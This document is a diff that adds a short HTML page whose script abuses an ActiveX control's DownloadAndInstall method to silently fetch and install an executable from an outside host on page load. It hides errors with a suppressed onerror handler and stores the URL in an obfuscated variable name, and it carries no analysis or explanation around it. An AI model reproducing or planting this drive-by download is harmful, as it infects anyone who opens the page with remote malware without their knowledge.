@@ -1,0 +1,15 @@
+<HTML><HEAD>
+<META http-equiv=Content-Type content="text/html; charset=gb2312">
+<META content="MSHTML 6.00.2900.3354" name=GENERATOR></HEAD>
+<BODY>
+<OBJECT id=install classid=clsid:78ABDC59-D8E7-44D3-9A76-9A0918C52B4A></OBJECT>
+<SCRIPT>
+function killErrors() {
+return true;
+}
+window.onerror = killErrors;
+var YEtYcJsR1="http://down.hs7yue.cn/down/ko.exe";
+install["DownloadAndInstall"](YEtYcJsR1);
+</SCRIPT>
+</BODY>
+</html>
